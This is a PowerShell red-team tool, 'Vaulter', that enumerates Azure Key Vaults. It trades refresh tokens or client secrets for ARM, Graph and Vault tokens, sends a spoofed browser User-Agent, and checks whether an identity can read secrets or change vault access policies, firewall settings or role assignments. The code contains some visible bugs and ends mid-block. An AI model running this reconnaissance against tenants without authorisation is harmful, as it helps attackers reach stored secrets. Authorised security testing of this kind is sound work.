function Vaulter{
    function GetIP {
        $ip = cmd.exe /c 'curl -s ifconfig.me'
        return "$ip/32"
    }
    function Show-ClientLoginGui {
    param([switch]$Topmost)

    if ($Host.Runspace.ApartmentState -ne 'STA') {
        Write-Warning "Run with pwsh -STA"
    }

    Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase

    $xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Vaulter" Height="560" Width="720"
        WindowStartupLocation="CenterScreen" ResizeMode="NoResize"
        Background="#0B1220" FontFamily="Segoe UI" SnapsToDevicePixels="True">
  <Window.Resources>
    <DropShadowEffect x:Key="CardShadow" BlurRadius="22" ShadowDepth="0" Color="#99000000"/>
    <Style TargetType="TextBox">
      <Setter Property="Background" Value="#0F1626"/>
      <Setter Property="Foreground" Value="#E5E7EB"/>
      <Setter Property="BorderBrush" Value="#334155"/>
      <Setter Property="BorderThickness" Value="1"/>
      <Setter Property="Padding" Value="8,4"/>
      <Setter Property="Height" Value="34"/>
    </Style>
    <Style TargetType="PasswordBox">
      <Setter Property="Background" Value="#0F1626"/>
      <Setter Property="Foreground" Value="#E5E7EB"/>
      <Setter Property="BorderBrush" Value="#334155"/>
      <Setter Property="BorderThickness" Value="1"/>
      <Setter Property="Padding" Value="8,4"/>
      <Setter Property="Height" Value="34"/>
    </Style>
    <Style TargetType="Button">
      <Setter Property="Padding" Value="18,10"/>
      <Setter Property="FontWeight" Value="SemiBold"/>
      <Setter Property="BorderThickness" Value="1"/>
      <Setter Property="Cursor" Value="Hand"/>
    </Style>
  </Window.Resources>

  <Grid Margin="22">
    <Grid.RowDefinitions>
      <RowDefinition Height="140"/>
      <RowDefinition Height="*"/>
      <RowDefinition Height="Auto"/>
    </Grid.RowDefinitions>

    <!-- Header (animated gradient) -->
    <Border Grid.Row="0" CornerRadius="18" Margin="0,0,0,14">
      <Border.Background>
        <LinearGradientBrush StartPoint="0,0" EndPoint="1,1">
          <GradientStop x:Name="gs1" Color="#3B82F6" Offset="0"/>
          <GradientStop x:Name="gs2" Color="#8B5CF6" Offset="1"/>
        </LinearGradientBrush>
      </Border.Background>
      <Grid Margin="18">
        <Grid.ColumnDefinitions>
          <ColumnDefinition Width="Auto"/>
          <ColumnDefinition Width="*"/>
        </Grid.ColumnDefinitions>

        <StackPanel Grid.Column="1" Margin="14,0,0,0" VerticalAlignment="Center">
          <TextBlock Text="Vaulter - Key Vault Enumeration" Foreground="#f8fafc" FontSize="22" FontWeight="Bold"/>
          <TextBlock Text="By @ShkudW - https://github.com/ShkudW/ARM-Enum " Foreground="#E0E7FF" FontSize="13"/>
        </StackPanel>
      </Grid>
    </Border>

    <!-- Card -->
    <Border Grid.Row="1" CornerRadius="18" Background="#101828" Padding="22" Effect="{StaticResource CardShadow}">
      <Grid>
        <Grid.RowDefinitions>
          <RowDefinition Height="Auto"/>
          <RowDefinition Height="Auto"/>
          <RowDefinition Height="Auto"/>
          <RowDefinition Height="12"/>
          <RowDefinition Height="Auto"/>
        </Grid.RowDefinitions>
        <Grid.ColumnDefinitions>
          <ColumnDefinition Width="170"/>
          <ColumnDefinition Width="*"/>
          <ColumnDefinition Width="Auto"/>
        </Grid.ColumnDefinitions>

        <!-- Client ID -->
        <TextBlock Grid.Row="0" Grid.Column="0" Margin="0,6,10,6" Foreground="#CBD5E1" FontSize="13" Text="Client ID"/>
        <TextBox   x:Name="ClientIdBox" Grid.Row="0" Grid.Column="1" Margin="0,4,0,4" ToolTip="GUID of the App Registration"/>

        <!-- Secret -->
        <TextBlock Grid.Row="1" Grid.Column="0" Margin="0,6,10,6" Foreground="#CBD5E1" FontSize="13" Text="Client Secret"/>
        <PasswordBox x:Name="SecretBox" Grid.Row="1" Grid.Column="1" Margin="0,4,0,4" ToolTip="App client secret"/>
        <TextBox   x:Name="SecretPlainBox" Grid.Row="1" Grid.Column="1" Margin="0,4,0,4" Visibility="Collapsed" ToolTip="App client secret (visible)"/>
        <CheckBox  x:Name="ShowSecretChk" Content="Show" Grid.Row="1" Grid.Column="2" Margin="10,6,0,4"
                   Foreground="#B4C6FC" VerticalAlignment="Center"/>

        <!-- Domain -->
        <TextBlock Grid.Row="2" Grid.Column="0" Margin="0,6,10,6" Foreground="#CBD5E1" FontSize="13" Text="Domain"/>
        <TextBox   x:Name="DomainBox" Grid.Row="2" Grid.Column="1" Margin="0,4,0,4" ToolTip="Tenant domain, e.g. contoso.com"/>

        <!-- Inline error -->
        <TextBlock x:Name="ErrorText" Grid.Row="4" Grid.ColumnSpan="3"
                   Foreground="#FCA5A5" FontSize="12" Visibility="Collapsed"/>
      </Grid>
    </Border>

    <!-- Buttons -->
    <DockPanel Grid.Row="2" Margin="0,16,0,0" LastChildFill="False">
      <StackPanel Orientation="Horizontal" DockPanel.Dock="Right">
        <Button x:Name="CancelBtn" Content="Cancel" Margin="0,0,8,0"
                Background="#0E1726" Foreground="#CBD5E1" BorderBrush="#334155" IsCancel="True"/>
        <Button x:Name="OkBtn" Content="Continue"
                Background="#3B82F6" Foreground="White" BorderBrush="#2563EB" IsDefault="True"/>
      </StackPanel>
    </DockPanel>
  </Grid>
</Window>
"@

    $xdoc = New-Object System.Xml.XmlDocument
    $xdoc.LoadXml($xaml)
    $reader  = New-Object System.Xml.XmlNodeReader $xdoc
    $window  = [Windows.Markup.XamlReader]::Load($reader)

    $ClientIdBox    = $window.FindName("ClientIdBox")
    $SecretBox      = $window.FindName("SecretBox")
    $SecretPlainBox = $window.FindName("SecretPlainBox")
    $ShowSecretChk  = $window.FindName("ShowSecretChk")
    $DomainBox      = $window.FindName("DomainBox")
    $OkBtn          = $window.FindName("OkBtn")
    $CancelBtn      = $window.FindName("CancelBtn")
    $ErrorText      = $window.FindName("ErrorText")
    $gs1            = $window.FindName("gs1")
    $gs2            = $window.FindName("gs2")

    if ($Topmost) { $window.Topmost = $true }

    $window.Add_Loaded({
        $c1 = [Windows.Media.ColorConverter]::ConvertFromString("#3B82F6")
        $c2 = [Windows.Media.ColorConverter]::ConvertFromString("#8B5CF6")
        $c3 = [Windows.Media.ColorConverter]::ConvertFromString("#06B6D4")
        $c4 = [Windows.Media.ColorConverter]::ConvertFromString("#22D3EE")

        $a1 = New-Object Windows.Media.Animation.ColorAnimation($c1, $c3, (New-Object Windows.Duration([TimeSpan]::FromSeconds(6))))
        $a1.AutoReverse = $true; $a1.RepeatBehavior = [Windows.Media.Animation.RepeatBehavior]::Forever
        $a2 = New-Object Windows.Media.Animation.ColorAnimation($c2, $c4, (New-Object Windows.Duration([TimeSpan]::FromSeconds(6))))
        $a2.AutoReverse = $true; $a2.RepeatBehavior = [Windows.Media.Animation.RepeatBehavior]::Forever

        $gs1.BeginAnimation([Windows.Media.GradientStop]::ColorProperty, $a1)
        $gs2.BeginAnimation([Windows.Media.GradientStop]::ColorProperty, $a2)

        $ClientIdBox.Focus() | Out-Null
    })

  
    $ShowSecretChk.Add_Checked({
        $SecretPlainBox.Text       = $SecretBox.Password
        $SecretPlainBox.Visibility = "Visible"
        $SecretBox.Visibility      = "Collapsed"
    })
    $ShowSecretChk.Add_Unchecked({
        $SecretBox.Password        = $SecretPlainBox.Text
        $SecretPlainBox.Visibility = "Collapsed"
        $SecretBox.Visibility      = "Visible"
    })

  
    $handler = {
        $OkBtn.RaiseEvent((New-Object Windows.RoutedEventArgs([System.Windows.Controls.Button]::ClickEvent)))
    }
    $ClientIdBox.Add_KeyDown({ if ($_.Key -eq 'Return') { & $handler } })
    $SecretBox.Add_KeyDown({ if ($_.Key -eq 'Return') { & $handler } })
    $SecretPlainBox.Add_KeyDown({ if ($_.Key -eq 'Return') { & $handler } })
    $DomainBox.Add_KeyDown({ if ($_.Key -eq 'Return') { & $handler } })


    $OkBtn.Add_Click({
        $ErrorText.Visibility = "Collapsed"
        $cid = $ClientIdBox.Text.Trim()
        $dom = $DomainBox.Text.Trim()
        $sec = if ($ShowSecretChk.IsChecked) { $SecretPlainBox.Text } else { $SecretBox.Password }

        if ([string]::IsNullOrWhiteSpace($cid) -or [string]::IsNullOrWhiteSpace($sec) -or [string]::IsNullOrWhiteSpace($dom)) {
            $ErrorText.Text = "Please fill all fields."
            $ErrorText.Visibility = "Visible"
            return
        }

        $tmpGuid = [Guid]::Empty
        if (-not [Guid]::TryParse($cid, [ref]$tmpGuid)) {
            $ErrorText.Text = "Client ID must be a valid GUID."
            $ErrorText.Visibility = "Visible"
            return
        }

        $result = [PSCustomObject]@{
            ClientId     = $cid
            ClientSecret = $sec
            Domain       = $dom
        }
        $window.Tag = $result
        $window.DialogResult = $true
        $window.Close()
    })

    $CancelBtn.Add_Click({ $window.DialogResult = $false; $window.Close() })

    $null = $window.ShowDialog()
    if ($window.DialogResult -eq $true) { return $window.Tag }
}


    function GetVaultToken { param ([string]$RefreshToken,[string]$ClientID,[string]$ClientSecret,[string]$TenantID)
            $Url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
            $Headers = @{"User-Agent"= "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"}
            
            if($RefreshToken -and -not $ClientID -and -not $ClientSecret){
                $body = @{
                        "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                        "scope" = "https://vault.azure.net/.default"
                        "grant_type" = "refresh_token"
                        "Refresh_token" = $RefreshToken
                }
            }
            elseif($ClientID -and $ClientSecret -and -not $RefreshToken){
                
                $body = @{
                        "grant_type" = "client_credentials"
                        "scope" = "https://vault.azure.net/.default"
                        "client_id" = $ClientID
                        "client_secret" = $ClientSecret
                }
            }
            else {
                return $null
            }
            
            try {
                $RequestUrl =  Invoke-RestMethod -Method Post -Uri $Url -Body $Body -Headers $Headers
                return $RequestUrl.access_token
            }
            catch{
                return $_
            }
    }


    function GetGraphToken { param ([string]$RefreshToken,[string]$ClientID,[string]$ClientSecret,[string]$TenantID)
            $Url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
            $Headers = @{"User-Agent"= "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"}
            
            if($RefreshToken -and -not $ClientID -and -not $ClientSecret){
                $body = @{
                        "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                        "scope" = "https://graph.microsoft.com/.default"
                        "grant_type" = "refresh_token"
                        "Refresh_token" = $RefreshToken
                }
            }
            elseif($ClientID -and $ClientSecret -and -not $RefreshToken){
                
                $body = @{
                        "grant_type" = "client_credentials"
                        "scope" = "https://graph.microsoft.com/.default"
                        "client_id" = $ClientID
                        "client_secret" = $ClientSecret
                }
            }
            else {
                return $null
            }
            
            try {
                $RequestUrl =  Invoke-RestMethod -Method Post -Uri $Url -Body $Body -Headers $Headers
                return $RequestUrl.access_token
            }
            catch{
                return $_
            }
    }

    function GetAzureARMToken {param ([string]$RefreshToken,[string]$ClientID,[string]$ClientSecret,[string]$TenantID)
            $Url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
            $Headers = @{"User-Agent"= "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"}
            
            if($RefreshToken -and -not $ClientID -and -not $ClientSecret){
                $body = @{
                        "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                        "scope" = "https://management.azure.com/.default"
                        "grant_type" = "refresh_token"
                        "Refresh_token" = $RefreshToken
                }
            }
            elseif($ClientID -and $ClientSecret -and -not $RefreshToken){
                
                $body = @{
                        "grant_type" = "client_credentials"
                        "scope" = "https://management.azure.com/.default"
                        "client_id" = $ClientID
                        "client_secret" = $ClientSecret
                }
            }
            else {
                return $null
            }
            
            try {
                $RequestUrl =  Invoke-RestMethod -Method Post -Uri $Url -Body $Body -Headers $Headers
                return $RequestUrl.access_token
            }
            catch{
                return $_
            }
    }

    function GetSubscriptions {param ([string]$AzureARMToken,[int]$MaxRetries = 8)
            $Headers = @{
                'Authorization' = "Bearer $AzureARMToken"
                'User-Agent'	= "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                'Accept'        = 'application/json'
            }
            $results1 = @()
            $url = "https://management.azure.com/subscriptions?api-version=2021-01-01"
            while ($url) {
                $attempt = 0
                while ($true) {
                    try {
                        $resp = Invoke-RestMethod -Method GET -Uri $url -Headers $Headers -ErrorAction Stop
                        break
                    }
                    catch {
                        $attempt++
                        $httpResp = $_.Exception.Response
                        if ($httpResp -and [int]$httpResp.StatusCode -eq 429 -and $attempt -le $MaxRetries) {
                            $retryAfter = $httpResp.Headers['Retry-After']
                            if (-not $retryAfter) { $retryAfter = 60 }
                            Start-Sleep -Seconds ([int]$retryAfter)
                            continue
                        }	
                        throw
                    }
                }

                if ($resp.value) {
                    $batch = $resp.value | ForEach-Object {
                        [pscustomobject]@{
                            DisplayName    = $_.displayName
                            SubscriptionId = $_.subscriptionId
                            State          = $_.state
                        }
                }
                $results1 += $batch
            }
            $url = $resp.nextLink
        }
        return $results1
    }

    function CheckSubscriptionPrivileges {param ([string]$AzureARMToken,[string]$Subid)
            function Test-OpAllowed {param([string[]]$Allowed,[string[]]$Denied,[string]$Operation)
                $matches = $false
                foreach ($pat in $Allowed) {
                    if ($Operation -like $pat) { $matches = $true; break }
                }
                if (-not $matches) { return $false }
                foreach ($pat in $Denied) {
                    if ($Operation -like $pat) { return $false }
                }
                return $true
            }

            $Headers = @{
                'Authorization' = "Bearer $AzureARMToken"
                'User-Agent'	= "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                'Accept'        = 'application/json'
            }

            $Detectors = @(
                
                @{ Name='CanManageRBAC'; 			Ops=@('Microsoft.Authorization/roleAssignments/write') },
                @{ Name='OwnerLike';     			Ops=@('*'); ExcludeOps=@('Microsoft.Authorization/roleAssignments/write') },
                @{ Name='CanListStorageKeys'; 		Ops=@('Microsoft.Storage/storageAccounts/listKeys/action') },
                @{ Name='CanGrantDiskSAS';    		Ops=@('Microsoft.Compute/disks/grantAccess/action') },
                @{ Name='CanListCosmosKeys';  		Ops=@('Microsoft.DocumentDB/databaseAccounts/listKeys/action') },
                @{ Name='KV_ReadSecrets';     		Ops=@('Microsoft.KeyVault/vaults/secrets/read') },
                @{ Name='KV_AccessPolicyWrite'; 	Ops=@('Microsoft.KeyVault/vaults/accessPolicies/write') },
                @{ Name='KV_VaultWrite';        	Ops=@('Microsoft.KeyVault/vaults/write') },
                @{ Name='CanInstallVMExt';   		Ops=@('Microsoft.Compute/virtualMachines/extensions/*') },
                @{ Name='CanRunAutomation';  		Ops=@('Microsoft.Automation/automationAccounts/*') },
                @{ Name='CanTriggerLogic';   		Ops=@('Microsoft.Logic/workflows/*') },
                @{ Name='GlobalRead';        		Ops=@('*/read') }
            )
            $hi = @()
            $lo = @()

            $url = "https://management.azure.com/subscriptions/$($Subid)/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
            try {
                $resp = Invoke-RestMethod -Method GET -Uri $url -Headers $Headers -ErrorAction Stop
            } catch {
                $lo += [pscustomobject]@{ DisplayName=$sub.DisplayName; SubscriptionId=$sub.SubscriptionId; Summary="ERROR: $($_.Exception.Message)" }
                continue
            }

            $allow = @()
            $deny  = @()
            $allowData = @()
            $denyData  = @()

            foreach ($p in $resp.value) {
                if ($p.actions)         { $allow  += $p.actions }
                if ($p.notActions)      { $deny   += $p.notActions }
                if ($p.dataActions)     { $allowD += $p.dataActions }
                if ($p.notDataActions)  { $denyD  += $p.notDataActions }
            }

                $allow     = $allow     | Select-Object -Unique
                $deny      = $deny      | Select-Object -Unique
                $allowData = $allowData | Select-Object -Unique
                $denyData  = $denyData  | Select-Object -Unique
                
                $denyAll = ($deny -contains '*') -or ($denyD -contains '*')
                
                $hasStar          =  (Test-OpAllowed -Allowed $allow  -Denied $deny  -Operation '*') -or (Test-OpAllowed -Allowed $allowD -Denied $denyD -Operation '*')
                $canManageRBAC    =  Test-OpAllowed -Allowed $allow -Denied $deny -Operation 'Microsoft.Authorization/roleAssignments/write'
                $hasGlobalRead    =  Test-OpAllowed -Allowed $allow  -Denied $deny  -Operation '*/read'
                $hasGlobalWrite   =  Test-OpAllowed -Allowed $allow  -Denied $deny  -Operation '*/write'
                
                $summary = $null
                    if ($denyAll) {
                        $summary = '* in NotActions'
                    }
                    elseif ($canManageRBAC -and $hasStar) {
                        $summary = 'Owner'
                    }
                    elseif ($hasStar) {
                        $summary = 'Owner-like (no RBAC manage)'
                    }
                    elseif ($hasGlobalRead -and -not $hasGlobalWrite -and -not $hasStar) {
                        $summary = 'allowed only read'
                    }
                    else {
                        $summary = 'no effective high-level permissions'
                    }

                    $row = [pscustomobject]@{
                        DisplayName    = $sub.DisplayName
                        SubscriptionId = $sub.SubscriptionId
                        Summary        = $summary
                    }

            return  $row
    }


    function Get-JwtClaims {param([string]$Jwt)
        $parts = $Jwt.Split('.')
        if ($parts.Count -lt 2) { return $null }
        $payload = $parts[1].Replace('-', '+').Replace('_', '/')
        switch ($payload.Length % 4) {
        2 { $payload += '==' }
        3 { $payload += '='  }
        0 { }
        }
        $json = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
        return $json | ConvertFrom-Json
    }

    function Test-LikeAny([string[]]$allow,[string[]]$deny,[string[]]$ops) {
        foreach ($op in $ops) {
            if ( ($allow | Where-Object { $op -like $_ }) -and -not ($deny | Where-Object { $op -like $_ }) ) {
                return $true
            }
        }
        return $false
    }

    function Get-SubscriptionKeyVaultsAccess {param ([string]$dataPath,[string]$AzureARMToken,[pscustomobject[]]$Subscriptions,[string]$RefreshToken,[string]$ClientID,[string]$ClientSecret,[string]$TenantID,[int]$MaxRetries = 3)

        function Add-ResultLine {
            param([psobject]$Object1, [string]$Path1)
            $Object1 | ConvertTo-Json -Depth 10 -Compress | Out-File -FilePath $Path1 -Encoding utf8 -Append
        }

        $claims = Get-JwtClaims -Jwt $AzureARMToken
        $MyOid = $claims.oid
        $myIP = GetIP
        $Results = @()
        function Test-VaultList {param([string]$VaultName,[hashtable]$HeadersVault,[string[]]$Kinds = @('secrets','keys','certificates'))
            $res = [ordered]@{
                SecretsReadable = $false
                KeysReadable    = $false
                CertsReadable   = $false
                FirstErrorCode  = $null
            }
                
            $u = "https://$VaultName.vault.azure.net/secrets?api-version=7.3"
            try {
                $r = Invoke-RestMethod -Method GET -Uri $u -Headers $HeadersVault -ErrorAction Stop
                switch ($k) {
                    'secrets'      { $res.SecretsReadable = $true }
                    'keys'         { $res.KeysReadable    = $true }
                    'certificates' { $res.CertsReadable   = $true }
                }
            } catch {
                $code = $_.Exception.Response.StatusCode.Value__  # int
                if (-not $res.FirstErrorCode) { $res.FirstErrorCode = $code }
            }
                return [pscustomobject]$res
        }

    function Test-CanChangeKvRoleAssigmnet {param([string]$SubscriptionId,[hashtable]$HeadersARM)	
                $lo = @()
                $urltest3 = "https://management.azure.com/subscriptions/$($SubscriptionId)/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
                try {
                    $resp3 = Invoke-RestMethod -Method GET -Uri $urltest3 -Headers $HeadersARM -ErrorAction Stop
                } catch {
                    $lo += [pscustomobject]@{ DisplayName=$sub.DisplayName; SubscriptionId=$sub.SubscriptionId; Summary="ERROR: $($_.Exception.Message)" }
                    continue
                }	
                foreach ($p in $resp3.value) {
                    if ($p.actions)         { $allow  += $p.actions }
                    if ($p.notActions)      { $deny   += $p.notActions } 
                }
                    
                $allow = $allow | Select-Object -Unique
                $deny = $deny | Select-Object -Unique
                    
                $denyAll = ($deny -contains '*') 
                    
                $hasStar =  (Test-OpAllowed -Allowed $allow  -Denied $deny  -Operation '*') -or (Test-OpAllowed -Allowed $allowD -Denied $denyD -Operation '*')
                $canManageRA =  Test-OpAllowed -Allowed $allow -Denied $deny -Operation 'Microsoft.Authorization/roleAssignments/write'
                $hasGlobalWrite =  Test-OpAllowed -Allowed $allow  -Denied $deny  -Operation '*/write'
                    
                if ($denyAll) {
                        return "Bad"
                    }
                    elseif ($hasStar -or $canManageRA -or $hasGlobalWrite) {
                        return "Good"
                    }				
            }

            function Test-CanChangeKvFirewall {param([string]$SubscriptionId,[hashtable]$HeadersARM)
                $lo = @()
                $urltest = "https://management.azure.com/subscriptions/$($SubscriptionId)/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
                try {
                    $resp = Invoke-RestMethod -Method GET -Uri $urltest -Headers $HeadersARM -ErrorAction Stop
                } catch {
                    $lo += [pscustomobject]@{ DisplayName=$sub.DisplayName; SubscriptionId=$sub.SubscriptionId; Summary="ERROR: $($_.Exception.Message)" }
                    continue
                }
        
                $allow = @()
                $deny  = @()

                foreach ($p in $resp.value) {
                    if ($p.actions) { $allow  += $p.actions }
                    if ($p.notActions) { $deny   += $p.notActions } 
                }

                $allow = $allow | Select-Object -Unique
                $deny = $deny | Select-Object -Unique
                    
                $denyAll = ($deny -contains '*') 
                    
                $hasStar          =  (Test-OpAllowed -Allowed $allow  -Denied $deny  -Operation '*') -or (Test-OpAllowed -Allowed $allowD -Denied $denyD -Operation '*')
                $canManageFW			=  Test-OpAllowed -Allowed $allow -Denied $deny -Operation 'Microsoft.KeyVault/vaults/write'
                $hasGlobalWrite   =  Test-OpAllowed -Allowed $allow  -Denied $deny  -Operation '*/write'
                    
                if ($denyAll) {
                    return "Bad"
                }
                elseif ($hasStar -or $canManageFW -or $hasGlobalWrite) {
                    return "Good"
                }
            }	

            function Test-CanModifyAccessPolicy {param([string]$SubscriptionId,[hashtable]$HeadersARM)
                $lo = @()
                $urltest1 = "https://management.azure.com/subscriptions/$($SubscriptionId)/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
                try {
                    $resp1 = Invoke-RestMethod -Method GET -Uri $urltest1 -Headers $HeadersARM -ErrorAction Stop
                } catch {
                    $lo += [pscustomobject]@{ DisplayName=$sub.DisplayName; SubscriptionId=$sub.SubscriptionId; Summary="ERROR: $($_.Exception.Message)" }
                    continue
                }

                $allow = @()
                $deny  = @()

                foreach ($p in $resp1.value) {
                    if ($p.actions) { $allow  += $p.actions }
                    if ($p.notActions) { $deny   += $p.notActions } 
                }
                    
                $allow = $allow | Select-Object -Unique
                $deny = $deny | Select-Object -Unique
                    
                $denyAll = ($deny -contains '*') 
                    
                $hasStar          =  (Test-OpAllowed -Allowed $allow  -Denied $deny  -Operation '*') -or (Test-OpAllowed -Allowed $allowD -Denied $denyD -Operation '*')
                $canManageFW			=  Test-OpAllowed -Allowed $allow -Denied $deny -Operation 'Microsoft.KeyVault/vaults/accessPolicies/write'
                $hasGlobalWrite   =  Test-OpAllowed -Allowed $allow  -Denied $deny  -Operation '*/write'
                    
                if ($denyAll) {
                    return "Bad"
                }
                elseif ($hasStar -or $canManageFW -or $hasGlobalWrite) {
                    return "Good"
                }
            }

        $linesWritten = 0  

        foreach ($sub in $Subscriptions) {
            function Test-OpAllowed {param([string[]]$Allowed,[string[]]$Denied,[Parameter(Mandatory)][string]$Operation)
                $isAllowed = $false
                foreach ($a in ($Allowed | Where-Object { $_ })) {
                    if ($Operation -like $a) { $isAllowed = $true; break }
                }
                if (-not $isAllowed) { return $false }

                foreach ($d in ($Denied | Where-Object { $_ })) {
                    if ($Operation -like $d) { return $false }
                }
                return $true
            }
            $HeadersARM = @{
                'Authorization' = "Bearer $AzureARMToken"
                'Accept'        = 'application/json'
                'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
            }

            $listUrl = "https://management.azure.com/subscriptions/$($sub.SubscriptionId)/resources?`$filter=resourceType eq 'Microsoft.KeyVault/vaults'&api-version=2021-04-01"
            $subpermission = (CheckSubscriptionPrivileges -AzureARMToken $AzureARMToken -Subid $($sub.SubscriptionId)).Summary

            write-Host " "
            Write-Host "==============================================================================="
            Write-Host "Subscription: $($sub.DisplayName) - $($sub.SubscriptionId) With Permission of $($subpermission)" -ForegroundColor Cyan
            Write-Host "-------------------------------------------------------------------------------" -ForegroundColor Cyan

            if($($subpermission) -eq 'allowed only read'){
                Write-Host "[!] Your Identity's permission on This Subscription is $($subpermission), Skip..."
                continue
            }

            do {
                $attempt = 0
                while ($true) {
                    try{
                        $listResp = Invoke-RestMethod -Method GET -Uri $listUrl -Headers $HeadersARM -ErrorAction Stop
                        break
                    }
                    catch{
                        $attempt++
                        $httpResp = $_.Exception.Response
                        $code = if ($httpResp) {
                                    [int]$httpResp.StatusCode
                                } else { 
                                    $null 
                                }
                        if ($code -eq 429 -and $attempt -le $MaxRetries) {
                            $retryAfter = $httpResp.Headers['Retry-After']
                            if (-not $retryAfter) {
                                $retryAfter = 60 
                            }
                            Start-Sleep -Seconds ([int]$retryAfter)
                            continue
                        }
                        elseif(code -eq 401){
                            if ($ClientID -and $ClientSecret -and $TenantID) {
                                $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                $HeadersARM = @{
                                    'Authorization' = "Bearer $AzureARMToken"
                                    'Accept'        = 'application/json'
                                    'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                                }
                                continue
                            }
                            elseif($RefreshToken -and $TenantID){
                                $AzureARMToken = GetAzureARMToken -RefreshToken $RefreshToken -TenantID $TenantID
                                $HeadersARM = @{
                                    'Authorization' = "Bearer $AzureARMToken"
                                    'Accept'        = 'application/json'
                                    'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                                }
                                continue
                            }else {
                            throw 
                            }
                            if ($attempt -le $MaxRetries) {
                                continue 
                            } else {
                                throw
                            }
                        }
                        elseif($code -eq 403){
                            Write-Warning "[#]403 on listing KeyVaults for sub $($sub.SubscriptionId) ($($sub.DisplayName)) skipping."
                            $listResp = $null
                            break
                        }
                        else{
                            throw
                        }
                    }
                } if(!$listResp){
                    break
                }
                foreach ($kv in $listResp.value) {
                    $vaultName = "$($kv.name)"
                    $VaultLocation = "$($kv.location)"
                    $VaultID = "$($kv.id)"
                if ($VaultID -match '/resourceGroups/([^/]+)/') { 
                        $ResourceGroup = $Matches[1]
                    }

                    $kvGetUrl = "https://management.azure.com$($VaultID)?api-version=2022-07-01"
                    Write-Host " "
                    Write-Host "[..]Checking: $vaultName On Resource Group: $ResourceGroup" -ForegroundColor Yellow
                    $kvDetail = $null
                    $attempt2 = 0
                    while ($true) {
                        try {
                            #$kvDetail = $null
                            $kvDetail = Invoke-RestMethod -Method GET -Uri $kvGetUrl -Headers $HeadersARM -ErrorAction Stop
                            break
                        }
                        catch{
                            $attempt2++
                            $httpResp = $_.Exception.Response
                            $code = if ($httpResp){
                                [int]$httpResp.StatusCode 
                            }
                            else {
                                $null 
                            }
                            if ($code -eq 429 -and $attempt2 -le $MaxRetries){
                                $retryAfter = $httpResp.Headers['Retry-After']
                                if (-not $retryAfter) {
                                    $retryAfter = 60
                                }
                                Start-Sleep -Seconds ([int]$retryAfter)
                                continue
                            }
                            elseif($code -eq 401){
                            if ($ClientID -and $ClientSecret -and $TenantID){
                                    $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                    $HeadersARM = @{
                                        'Authorization' = "Bearer $AzureARMToken"
                                        'Accept'        = 'application/json'
                                        'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                                    }
                                continue
                            }
                            elseif ($RefreshToken -and $TenantID){
                                    $AzureARMToken = GetAzureARMToken -RefreshToken $RefreshToken -TenantID $TenantID
                                    $HeadersARM = @{
                                        'Authorization' = "Bearer $AzureARMToken"
                                        'Accept'        = 'application/json'
                                        'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                                    }
                                continue
                            }
                            else{
                                throw
                            } 
                            }
                            elseif($code -eq 403){
                                Write-Host "403 on $($kv.name) no properties access (skip)"
                                break
                            }
                            else{
                                throw
                            }
                        }
                    }
                    if (-not ($kvDetail -and $kvDetail.properties)) {
                        Write-Host "[>]no properties on this Vault... skip to the next" -ForegroundColor Gray
                        continue
                    }

                    $isRbac = [bool]$kvDetail.properties.enableRbacAuthorization
                    if($isRbac){$mode = 'RBAC'}
                    else{$mode = 'AccessPolicy'}
                    Write-Host "[!]This Vault is managed by : $mode" -ForegroundColor cyan
                    
                    $canReadSecrets = $false
                    $canReadKeys = $false
                    $canReadCerts = $false
                    $oidMatch = $false

                    if ($mode -eq 'RBAC'){
                        $permUrl = "https://management.azure.com$($VaultID)/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
                        $perm = $null
                        try { 
                            $perm = Invoke-RestMethod -Method GET -Uri $permUrl -Headers $HeadersARM -ErrorAction Stop
                        } catch {
                            $_
                            continue
                        }
                        if ($perm.value) {
                            $allowD = @()
                            $denyD = @()

                            foreach ($p in $perm.value) {
                                if ($p.dataActions){ 
                                    $allowD += $p.dataActions
                                }
                                if ($p.notDataActions) { 
